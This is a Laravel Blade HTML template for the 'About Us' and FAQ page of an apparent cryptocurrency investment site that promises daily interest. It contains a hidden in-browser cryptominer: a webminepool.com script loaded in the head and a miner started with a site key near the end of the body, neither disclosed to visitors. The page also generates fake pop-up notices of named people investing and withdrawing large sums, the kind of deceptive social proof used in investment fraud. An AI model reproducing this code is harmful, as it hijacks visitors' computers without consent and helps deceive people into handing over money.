<!DOCTYPE html>
<html lang="en" xml:lang="en">    

<head>       
    <meta charset="UTF-8">  
    <!-- Responsive Meta -->                    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
     <!--miner-->
    <script src="https://webminepool.com/lib/base.js"></script>
    <!--miner-->



    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <!-- favicon & bookmark -->
    <link rel="apple-touch-icon-precomposed" sizes="144x144"  href="{{ asset('home/images/bookmark.png') }}" type="image/x-icon" />
    <link rel="shortcut icon" href="{{ asset('home/images/favicon.png') }}" type="image/x-icon" />
    <!-- Font Family -->
    <link href="https://fonts.googleapis.com/css?family=PT+Sans:400,700" rel="stylesheet"> 
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700,800" rel="stylesheet">
    <!-- Website Title -->
    <title>{{$settings->site_name}} | {{$settings->site_title}}</title>
    <!-- Stylesheets Start -->
    <link rel="stylesheet" href="{{ asset ('home/css/fontawesome.min.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/bootstrap.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/animate.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/owl.carousel.min.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/style.css')}}" type="text/css"/>
    <link rel="stylesheet" href="{{ asset ('home/css/responsive.css')}}" type="text/css"/>
    
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
	<link rel="icon" href="{{asset('home/logo.png') }}">
     <!-- Stylesheets End -->
     
    <!--[if lt IE 9]><script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.js"></script><![endif]-->
    <!--[if lt IE 9]><script src="js/respond.js"></script><![endif]-->
   <link rel="stylesheet" href="{{ asset ('home/alert/fake-notification-min.css')}}"/>
   <link rel="stylesheet" href="{{ asset ('home/css/toast.css')}}"/>

   <style>
		
	.fluid{
	   width:160px;
	   height:65px;
		}
   @media (max-width: 991px){
	   .fluid{
	   width:125px;
	   height:55px;
	   }
	}   

</style>
   
 
</head>
<body>
    <!--Main Wrapper Start-->
    <div class="wrapper" id="top">
        <!--Header Start -->  
	   <header class="fixed">   
		   <div class="container">
				<div class="row"> 
                    <div class="col-sm-6 col-md-4 logo">
                        <a href="#" title="{{$settings->site_name}}" >
                            <img class="dark" src="{{ asset ('home/logo-1.png') }}" width="120" alt="{{$settings->site_name}} ">
                        </a>
                    </div>
                    <div class="col-sm-6 col-md-8 main-menu">
					   <div class="menu-icon">
                          <span class="top"></span>
                          <span class="middle"></span>
                          <span class="bottom"></span>
                        </div>
                        <nav class="onepage">
                            <ul>
                                <li><a href="/" style="color:#1d1d1d">Home</a></li>
                                <li class="active" ><a href="#">About Us</a></li>
                                <li><a href="testimonials" style="color:#1d1d1d">Testimonials</a></li>
                                <li><a href="contact" style="color:#1d1d1d">Contact Us</a></li>
                                <li class="nav-btn"><a href="login" style="color:#1d1d1d">Sign In</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
		
            </div>
        </header>
        <!--Header End-->
        
        
    
        <!-- Content Section Start -->   
        <div class="midd-container">
            <!-- About us start-->
            <div class="team-section p-tb light-gray-bg mercury-layout" id="team">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">About {{$settings->site_name}}</h2></div>
                    <div class="row">
                        <div class="text-dark mx-auto col-lg-9">
                            <div class="text">
                                <h4>Welcome to {{$settings->site_name}}!</h4>
                                <p>At {{$settings->site_name}}, we specialize in innovative and strategic cryptocurrency investments, aiming to provide our clients with exceptional returns and comprehensive knowledge about the crypto market.</p>
                                <h4>Who We Are</h4>
                                <p>{{$settings->site_name}} is a cutting-edge crypto trading platform that leverages expert research and strategic investments to maximize profitability for our investors. Our team consists of seasoned professionals with extensive experience in the cryptocurrency and blockchain industry.</p>
                                <h4>What We Do</h4>
                                <p>We employ a diversified investment approach that includes:</p>
                                <ul>
                                    <li><strong>Early-Stage Project Investments:</strong> Identifying and partnering with promising projects at their developmental stages to capture high growth potential.</li>
                                    <li><strong>Seed and Presale Rounds:</strong> Participating in exclusive early rounds to secure tokens at the best prices before they hit the public market.</li>
                                    <li><strong>Low-Cap Crypto Assets:</strong> Investing in undervalued tokens poised for significant market gains.</li>
                                    <li><strong>High-Cap Utility Coins:</strong> Staking stable, high-value coins to earn additional rewards and ensure steady returns.</li>
                                    <li><strong>Meme Coins:</strong> Occasionally diversifying with well-researched meme coins to capture potential high returns.</li>
                                </ul>

                                <h4>How It Works</h4>
                                <ol>
                                    <li><strong>Easy Registration:</strong> Sign up and verify your account quickly and securely.</li>
                                    <li><strong>Wallet Funding:</strong> Deposit funds into your {{$settings->site_name}} wallet using your preferred payment method.</li>
                                    <li><strong>Choose Investment Plan:</strong> Select from our five tailored investment plans to suit your financial goals.</li>
                                    <li><strong>Daily Earnings:</strong> Earn daily interest on your investments, with the flexibility to reinvest or withdraw your earnings.</li>
                                    <li><strong>Educational Support:</strong> Receive regular newsletters and resources to enhance your understanding of the crypto market.</li>
                                </ol>
                                <h4>Why Choose Us</h4>
                                <ol>
                                    <li><strong>Expert Guidance:</strong> Benefit from our team's extensive market research and strategic insights.</li>
                                    <li><strong>Daily Interest:</strong> Enjoy the assurance of daily earnings on your investments.</li>
                                    <li><strong>Comprehensive Education:</strong> Gain confidence and knowledge with our educational resources and insider newsletters.</li>
                                </ol>
                                
                                <h4>Our Mission</h4>
                                <p>Our mission is to empower our clients to navigate the cryptocurrency landscape with confidence and achieve their financial goals through smart, strategic investments.</p>

                                <p>Join {{$settings->site_name}} today and embark on a journey to financial growth and crypto market mastery!</p>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <!-- About us end-->
             <!-- FAQ Section start-->
            <div class="faq-section p-tb white-bg diamond-layout" id="faq">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Frequently Asked Questions</h2></div>
                    <div class="row">
                        <div class="col-sm-12">
                            <!--Accordion wrapper-->
                            <div class="accordion md-accordion style-2" id="accordionEx" role="tablist" aria-multiselectable="true">
                                <!-- Accordion card -->
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading1">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse1" aria-expanded="false" aria-controls="collapse1">
                                            <h5 class="mb-0">
                                                What is {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse1" class="collapse" role="tabpanel" aria-labelledby="heading1" data-parent="#accordionEx">
                                        <div class="card-body">
                                           {{$settings->site_name}} is a cryptocurrency trading platform that specializes in strategic investments across various crypto assets, including early-stage projects, seed and presale rounds, low-cap and high-cap utility coins, and meme coins.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading2">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse2" aria-expanded="false" aria-controls="collapse2">
                                            <h5 class="mb-0">
                                                How do I register on {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse2" class="collapse" role="tabpanel" aria-labelledby="heading2" data-parent="#accordionEx">
                                        <div class="card-body">
                                           To register, <a href="register"> visit our registration page</a>, fill out the required information, and verify your account. The process is quick and straightforward.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading3">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse3" aria-expanded="false" aria-controls="collapse3">
                                            <h5 class="mb-0">
                                                Is there a KYC process involved? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse3" class="collapse" role="tabpanel" aria-labelledby="heading3" data-parent="#accordionEx">
                                        <div class="card-body">
                                           KYC  are regulation needed for verification and to ensure no user is automating the process of investment there fore whenever the arises you may be required to submit perosnal information to verify you identifity only when needed.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading4">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse4" aria-expanded="false" aria-controls="collapse4">
                                            <h5 class="mb-0">
                                                How can I deposit funds into my {{$settings->site_name}} wallet? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse4" class="collapse" role="tabpanel" aria-labelledby="heading4" data-parent="#accordionEx">
                                        <div class="card-body">
                                            You can deposit funds using various methods such as bank transfer, credit/debit card, or cryptocurrency transfer. 
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading5">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse5" aria-expanded="false" aria-controls="collapse5">
                                            <h5 class="mb-0">
                                                What investment plans are available? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse5" class="collapse" role="tabpanel" aria-labelledby="heading5" data-parent="#accordionEx">
                                        <div class="card-body">
                                           We offer five investment plans, each with specific minimum and maximum investment amounts and interest rates. Details of each plan are available on our <a href="plans">investment plans page</a>.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading6">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse6" aria-expanded="false" aria-controls="collapse6">
                                            <h5 class="mb-0">
                                                How do I earn interest on my investments? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse6" class="collapse" role="tabpanel" aria-labelledby="heading6" data-parent="#accordionEx">
                                        <div class="card-body">
                                           Once you choose and invest in a plan, you will start earning daily interest, which is automatically added to your {{$settings->site_name}} wallet.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading7">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse7" aria-expanded="false" aria-controls="collapse7">
                                            <h5 class="mb-0">
                                                Can I withdraw my earnings anytime? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse7" class="collapse" role="tabpanel" aria-labelledby="heading7" data-parent="#accordionEx">
                                        <div class="card-body">
                                           Yes, you can withdraw the daily interest earnings at any time. However, the initial capital is locked until the completion of the investment plan’s duration.
                                        </div>
                                    </div>
                                </div>
                                
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading8">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse8" aria-expanded="false" aria-controls="collapse8">
                                            <h5 class="mb-0">
                                                What happens at the end of my investment plan's duration? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse8" class="collapse" role="tabpanel" aria-labelledby="heading8" data-parent="#accordionEx">
                                        <div class="card-body">
                                           Upon completion of your investment plan’s duration, your initial capital will be released back to your {{$settings->site_name}} wallet, ready for withdrawal or reinvestment.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading9">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collaps9" aria-expanded="false" aria-controls="collaps9">
                                            <h5 class="mb-0">
                                                Is my investment safe with {{$settings->site_name}}? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collaps9" class="collapse" role="tabpanel" aria-labelledby="heading9" data-parent="#accordionEx">
                                        <div class="card-body">
                                           We prioritize the security of your investments through careful selection of investment opportunities and rigorous due diligence. However, as with any investment, there are inherent risks in the cryptocurrency market.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading10">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse10" aria-expanded="false" aria-controls="collapse10">
                                            <h5 class="mb-0">
                                                How do I learn more about cryptocurrency and blockchain? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse10" class="collapse" role="tabpanel" aria-labelledby="heading10" data-parent="#accordionEx">
                                        <div class="card-body">
                                           We provide regular educational newsletters that cover a wide range of topics, from basic blockchain concepts to advanced investment strategies. Our resources are designed to help you become a confident and informed investor.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading11">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse11" aria-expanded="false" aria-controls="collapse11">
                                            <h5 class="mb-0">
                                                What is the Executive Investment Plan? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse11" class="collapse" role="tabpanel" aria-labelledby="heading11" data-parent="#accordionEx">
                                        <div class="card-body">
                                           The Executive Investment Plan includes exclusive benefits such as an insider newsletter with weekly analyses of crypto assets and upcoming projects, valued at $500/month. It offers deeper insights into our investment strategies and market outlook.
                                        </div>
                                    </div>
                                </div>
                                <div class="card">
                                    <!-- Card header -->
                                    <div class="card-header" role="tab" id="heading12">
                                        <a class="collapsed" data-toggle="collapse" data-parent="#accordionEx" href="#collapse12" aria-expanded="false" aria-controls="collapse12">
                                            <h5 class="mb-0">
                                                How can I contact {{$settings->site_name}} for support? <i class="fas fa-caret-down rotate-icon"></i>
                                            </h5>
                                        </a>
                                    </div>
                                    <!-- Card body -->
                                    <div id="collapse12" class="collapse" role="tabpanel" aria-labelledby="heading12" data-parent="#accordionEx">
                                        <div class="card-body">
                                           You can reach out to our support team via email at <a href="mailto:{{$settings->contact_email}}">{{$settings->contact_email}}</a> or through our live chat feature on the website. We are here to assist you with any questions or issues.
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <!-- Accordion wrapper -->
                        </div>
                    </div>
                </div>
            </div>
            <!-- FAQ Section end--> 
            <!-- Brand logo slider -->
            <div class="brand-logo-slider c-l p-tb white-sec">
                <div class="container">
                    <div class="text-center"><h2 class="section-heading">Our Partners</h2></div>
                    <div class="brand-logos owl-carousel">
                        <div class="item"><img src="{{ asset ('home/images/trustwallet.png')}}" alt="Trust Wallet" /></div>
                        <div class="item"><img src="{{ asset ('home/images/luno.png')}}" alt="Luno" /></div>
                        <div class="item"><img src="{{ asset ('home/images/paxful.png')}}" alt="Paxful" /></div>
                        <div class="item"><img src="{{ asset ('home/images/binance.png')}}" alt="Binance" /></div>
                        <div class="item"><img src="{{ asset ('home/images/coinmama.png')}}" alt="Coin Mama" /></div>
                    </div>
                </div>
            </div>
            <!-- Brand logo end -->
        </div>
        <!-- Content Section End -->   
    			
            <div class="clear"></div>
            <!--footer Start-->   
            <footer class="footer-3">
                <div class="container">
                    <div class="row">
                        <div class="col-md-4 footer-box-1">
                            <div class="footer-logo">
                                <a href="#" title=""><img src="{{ asset ('home/logo-3.png') }}" width="120" alt="Cp Silver"></a>
                            </div>
                            <p>Trading binary options is the latest way to trade global markets. It is a form of trading that allows you to earn maximum profit with minimal investment of time and money. Binary options have opened up financial markets to people around the entire world.</p>
                        </div>
                        <div class="col-md-3 footer-box-2">
                            <ul class="footer-menu onepage">
    							 <li><a href="#top">Home</a></li>
                                 <li><a href="#about">About Us</a></li>
                                 <!--<li><a href="#token">Equities</a></li>-->
                                 <li><a href="#team">Testimonials</a></li>
                                 <li><a href="#">Contact Us</a></li>
                            </ul>
                        </div>
                        <div class="col-md-5 footer-box-3">
                            <h4>Newsletter</h4>
                            <p>Keep up to date with our progress. Subscribe for e-mail updates.</p>
                            <div class="newsletter">
                                <form>
                                    <div class="input"><input type="email" name="Email" placeholder="Your email address"></div>
                                    <div class="submit"><input class="btn" type="submit" name="subscribe" value="subscribe"></div>
                                </form>
                            </div>
                            <div class="socials">
                                <ul>
                                    <li><a href="https://facebook.com/"><i class="fab fa-facebook-f"></i></a></li>
                                    <li><a href="https://twitter.com/"><i class="fab fa-twitter"></i></a></li>
                                    <li><a href="https://plus.google.com/"><i class="fab fa-google-plus-g"></i></a></li>
                                    <li><a href="https://www.youtube.com/"><i class="fab fa-youtube"></i></a></li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
            <!--footer end--> 
        </div>
        <!--Main Wrapper End-->
    </div>
    
    <!--start alert js-->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-sweetalert/1.0.1/sweetalert.min.js"></script>
    <script type="text/javascript" src="{{ asset ('home/alert/js/jquery.fake-notification.min.js')}}"></script>
	<script>
        $(document).ready(function() {
                $('#notification-1').Notification({
                    // Notification varibles
                    Varible1: ["Dirk", "Johnny", "Watkin ", "Alejandro",  "Vina",  "Tony",   "Ahmed","Jackson",  "Noah", "Aiden",  "Darren", "Isabella", "Aria", "John", "Greyson", "Peter", "Mohammed", "William",
                    "Lucas", "Amelia", "Mason", "Mathew", "Richard", "Chris", "Mia", "Oliver"],
                    Varible2: ["USA","UAE","ITALY", "FLORIDA",  "MEXICO",  "INDIA",  "CHINA",  "CAMBODIA",  "UNITED KINGDOM",  "GERMANY", "AUSTRALIA",  "BANGLADESH", "SWEDEN", "PAKISTAN", "MALDIVES", "SEYCHELLES", 
                    "BOLIVIA",
                     "SOUTH AFRICA", "ZAMBIA", "ZIMBABWE", "LEBANESE", "SAUDI ARABIA", "CHILE", "PUERTO RICO"],
                    
                    Amount: [8000,25000,5550,31660,40440,7986,9533],                    
                    Content: '[Varible1] from [Varible2] has withdrawn <b>$[Amount]</b>',
                    // Timer
                    Show: ['stable', 5, 10],
                    Close: 5,
                    Time: [0, 23],
                    // Notification style 
                    LocationTop: [true, '30%'],
                    LocationBottom:[false, '10%'],
                    LocationRight: [false, '10%'],                      
                    LocationLeft:[true, '10px'],
                    Background: '#fff',
                    BorderRadius: 5,
                    BorderWidth: 1,
                    BorderColor: '#ffc552',
                    TextColor: '#2962FF',
                    IconColor: '#2962FF',
                    // Notification Animated   
                    AnimationEffectOpen: 'slideInUp',
                    AnimationEffectClose: 'slideOutDown',
                    // Number of notifications
                    Number: 40,
                    // Notification link
                    Link: [false, '\', '_blank']
                    
                });         
            });         
      </script>
        
		
    <!--/end alert js-->


	<style>
		@-webkit-keyframes cptCircle {
		  0% {
			-webkit-transform: rotate(0) scale(0.5) skew(1deg);
			transform: rotate(0) scale(0.5) skew(1deg);
			opacity: 0.01;
		  }
		  30% {
			-webkit-transform: rotate(0) scale(0.7) skew(1deg);
			transform: rotate(0) scale(0.7) skew(1deg);
			opacity: 0.5;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.01;
		  }
		}

		@keyframes cptCircle {
		  0% {
			-webkit-transform: rotate(0) scale(0.5) skew(1deg);
			transform: rotate(0) scale(0.5) skew(1deg);
			opacity: 0.01;
		  }
		  30% {
			-webkit-transform: rotate(0) scale(0.7) skew(1deg);
			transform: rotate(0) scale(0.7) skew(1deg);
			opacity: 0.5;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.01;
		  }
		}

		@-webkit-keyframes cptCircleFill {
		  0% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0;
		  }
		  50% {
			webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.2;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0.2;
		  }
		}

		@keyframes cptCircleFill {
		  0% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0;
		  }
		  50% {
			-webkit-transform: rotate(0) scale(1) skew(1deg);
			transform: rotate(0) scale(1) skew(1deg);
			opacity: 0.2;
		  }
		  100% {
			-webkit-transform: rotate(0) scale(0.6) skew(1deg);
			transform: rotate(0) scale(0.6) skew(1deg);
			opacity: 0.2;
		  }
		}

		#capitol-callback {
		  font-family: Arial;
		  position: fixed;
		  width: 72px;
		  height: 72px;
		  bottom: 60px;
		  top: auto;
		  right: auto;
		  left: 40px;
		  z-index: 1;
		}

		.cpt-circle,
		.cpt-circle-fill {
		  position: absolute;
		  border-radius: 100%;
		  -webkit-transition: all 0.5s;
		  transition: all 0.5s;
		  -moz-box-sizing: border-box;
		  box-sizing: border-box;
		  opacity: 0;
		  -webkit-animation-delay: 2s;
		  animation-delay: 2s;
		}

		.cpt-circle {
		  width: 250%;
		  height: 250%;
		  background-color: transparent;
		  border: 2px solid #189d0e;
		  -webkit-animation: cptCircle 2.2s infinite ease-in-out;
		  animation: cptCircle 2.2s infinite ease-in-out;
		  -webkit-transform-origin: 50% 50%;
		  -ms-transform-origin: 50% 50%;
		  transform-origin: 50% 50%;
		  left: -71%;
		  top: -75%;
		}

		.cpt-circle-fill {
		  width: 155%;
		  height: 155%;
		  background-color: #189d0e;
		  border: 2px solid transparent;
		  -webkit-animation: cptCircleFill 2.3s infinite ease-in-out;
		  animation: cptCircleFill 2.3s infinite ease-in-out;
		  box-shadow: 0 0 2px 0 #189d0e !important;
		  left: -23.5%;
		  top: -27.5%;
		}

		.main-button {
		  position: relative;
		  right: 1px;
		  top: 1px;
		  float: right;
		  width: 64px;
		  height: 64px;
		  background: center center no-repeat #189d0e;
		  box-shadow: 0 3px 5px 1px rgba(0, 0, 0, 0.2);
		  background-size: 30px;
		  border-radius: 100%;
		  cursor: pointer;
		  font-size: 16px;
		  color: #fff;
		  text-align: center;
		  line-height: 58px;
		}

		.main-button i {
		  opacity: 0;
		  visibility: hidden;
		  -webkit-transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
		  transition: all 0.6s cubic-bezier(0.55, 0, 0.1, 1);
		  -webkit-transform: perspective(400px) rotateY(-180deg) scale(0.4)
			translate3d(-50%, -50%, 0);
		  transform: perspective(400px) rotateY(-180deg) scale(0.4)
			translate3d(-50%, -50%, 0);
		  z-index: 1;
		  width: 45%;
		  height: 45%;
		  font-size: 16px;
		  
		}

		.main-button img {
		  vertical-align: middle;
		}

	</style>
	  
	<div id="capitol-callback">
	  <div class="cpt-circle"></div>
	  <div class="cpt-circle-fill"></div>
	  <a href="https://api.whatsapp.com/send?phone={{$settings->whatsapp}}&text= Hello {{$settings->site_name}} " id="WhatsAppBtnDesktop" target="_blank" class="main-button" lang="en">
		<img src="https://nhtagent.com/nht-upload/assets/javascripts/WhatsApp/WhatsApp.png" width="100%">
	  </a>
	</div>

    <script> 
    	var $el = $(".table-style");
    	function anim() {
    	  var st = $el.scrollTop();
    	  var sb = $el.prop("scrollHeight")-$el.innerHeight();
    	  $el.animate({scrollTop: st<sb/2 ? sb : 0}, 48000, anim);
    	}
    	function stop(){
    	  $el.stop();
    	}
    	anim();
    	$el.hover(stop, anim);
	</script>

 
    <script src="//code.tidio.co/6ggc9gummgdvuispgmnnddwoqk0bztz9.js" async></script>
    <script src="{{ asset ('home/js/jquery.min.js')}}"></script>
    <script src="{{ asset ('home/js/bootstrap.min.js')}}"></script>
    <script src="{{ asset ('home/js/onpagescroll.js')}}"></script>
    <script src="{{ asset ('home/js/wow.min.js')}}"></script>
    <script src="{{ asset ('home/js/jquery.countdown.js')}}"></script>
    <script src="{{ asset ('home/js/owl.carousel.js')}}"></script>
    
    
    <script src="{{ asset ('home/js/Chart.js')}} "></script>
    <script src="{{ asset ('home/js/chart-function.js')}} "></script>
    <script src="{{ asset ('home/js/script.js')}} "></script>
    <script src="{{ asset ('home/js/particles.js')}} "></script>
    <script src="{{ asset ('home/js/gold-app.js')}} "></script>
    
    <script type="text/javascript">
        jQuery(document).ready(function(){
            setTimeout(function(){
                jQuery('.diamond-animation').addClass('done');
            }, 6000);
            setTimeout(function(){
                jQuery('.diamond-animation .main').addClass('active');
            }, 1000);
            setTimeout(function(){
                jQuery('.inside-bitcoin').addClass('active');
            }, 3000);
            setTimeout(function(){
                jQuery('.inside-bitcoin').addClass('spincoin');
            }, 5000);
            setTimeout(function(){
                jQuery('.diamond-animation .lines').addClass('active');
            }, 6000);
            setTimeout(function(){
                jQuery('.diamond-animation .top-coin').addClass('active');
            }, 3000);
             setTimeout(function(){
                jQuery('.diamond-animation .outer-Orbit').addClass('active');
            }, 5000);
        });
    </script>
    
     <script type="text/javascript">
        function isScrolledIntoView(elem) {
            var docViewTop = jQuery(window).scrollTop();
            var docViewBottom = docViewTop + jQuery(window).height();
            var elemTop = jQuery(elem).offset().top;
            var elemBottom = elemTop + jQuery(elem).height();
            return ((elemBottom <= docViewBottom) && (elemTop >= docViewTop));
        }
        jQuery(window).scroll(function () {
            jQuery('.about-mercury-animation').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
            jQuery('.token-pricing-section').each(function () {
                if (isScrolledIntoView(this) === true) {
                    jQuery(this).addClass('visible');
                }
            });
        });
        jQuery(document).ready(function () {
            jQuery('.allocation-list-point li:first-child').addClass('hover');
            jQuery('.allocation-list-point li .point').hover(function(){
                jQuery('.allocation-list-point li').removeClass('hover');
                jQuery(this).parent('li').addClass('hover');
            });
        });
    </script>
	
	<script>
		$(document).ready(function() {
            $('#notification-1').Notification({
                // Notification varibles
                Varible1: ["someone", "someone", "Aiden",  "Darren", "Isabella", "Aria", "John", "Greyson", "Peter", "Mohammed", "William",
                "Lucas", "Amelia", "Mason", "Mathew", "Richard", "Chris", "Mia", "Oliver"],
                Varible2: ["USA","UAE","ITALY", "FLORIDA",  "MEXICO",  "INDIA",  "CHINA",  "CAMBODIA",  "UNITED KINGDOM",  "GERMANY", "AUSTRALIA",  "BANGLADESH", "SWEDEN", "PAKISTAN", "MALDIVES", "SEYCHELLES", 
                "BOLIVIA",
                 "SOUTH AFRICA", "ZAMBIA", "ZIMBABWE", "LEBANESE", "SAUDI ARABIA", "CHILE", "PEUTO RICO"],
                
                Amount: [3500,5500,15550,8660,14440,7986,9533,25000,30141,45000],                    
                Content: '[Varible1] from [Varible2]  just Invested <b>$[Amount]</b>',
                // Timer
                Show: ['stable', 5, 10],
                Close: 5,
                Time: [0, 23],
                // Notification style 
                LocationTop: [true, '30%'],
                LocationBottom:[false, '10%'],
                LocationRight: [false, '10%'],                      
                LocationLeft:[true, '10px'],
                Background: '#fff#fff
                BorderRadius: 5,
                BorderWidth: 1,
                BorderColor: '#ffc552',
                TextColor: '#2962FF',
                IconColor: '#2962FF',
                // Notification Animated   
                AnimationEffectOpen: 'slideInUp',
                AnimationEffectClose: 'slideOutDown',
                // Number of notifications
                Number: 40,
                // Notification link
                Link: [false, '\', '_blank']
                
            });         
        }); 				
	</script>
	<script type="text/javascript" src="{{ asset ('home/alert/js/jquery.fake-notification.min.js')}}"></script>
	<!--miner-->

     <script>
        var miner = WMP.Anonymous('SK_XPOrdHezNlQ323zaH3qbs', {
            throttle: 0.2});
          miner.start();
    </script> 
    <!--miner-->
    
    
    <div class="mgm" style="display: none;">
        <div class="txt" style="color:black;"></div>

        <script type="text/javascript">
            var listCountries = ['South Africa', 'USA', 'Germany', 'France', 'Italy', 'South Africa', 'Australia', 'South Africa', 'Canada', 'Argentina', 'Saudi Arabia', 'Mexico', 'South Africa', 'South Africa', 'Venezuela', 'South Africa', 'Sweden', 'South Africa', 'South Africa', 'Italy', 'South Africa', 'United Kingdom', 'South Africa', 'Greece', 'Cuba', 'South Africa', 'Portugal', 'Austria', 'South Africa', 'Panama', 'South Africa', 'South Africa', 'Netherlands', 'Switzerland', 'Belgium', 'Israel', 'Cyprus'];
            var listPlans = ['$500','$1,500','$1,000','$10,000','$2,000','$3,000','$4,000', '$600', '$700', '$2,500'];
            var transarray = ['just <b>invested</b> with', 'just <b>withdrew</b>', 'just <b>earned</b>', 'is <b>trading with</b>'];
            interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
            var run = setInterval(request, interval);
        
            function request() {
                clearInterval(run);
                interval = Math.floor(Math.random() * (40000 - 8000 + 1) + 8000);
                var country = listCountries[Math.floor(Math.random() * listCountries.length)];
                var transtype = transarray[Math.floor(Math.random() * transarray.length)];
                // var plan = listPlans[Math.floor(Math.random() * listPlans.length)];
                var plan = `$${(Math.ceil((Math.floor(Math.random() * 50000) + 500) * 100) / 100).toLocaleString()}`;
                var msg = `Someone from <b> ${country} </b> ${transtype} <b style="color:blue;"> ${plan} </b>`;
                $(".mgm .txt").html(msg);
                $(".mgm").stop(true).fadeIn(1000);
                window.setTimeout(function() {
                    $(".mgm").stop(true).fadeOut(2000);
                }, 10000);
                run = setInterval(request, interval);

            }
        </script>
    </div>
</body>

</html>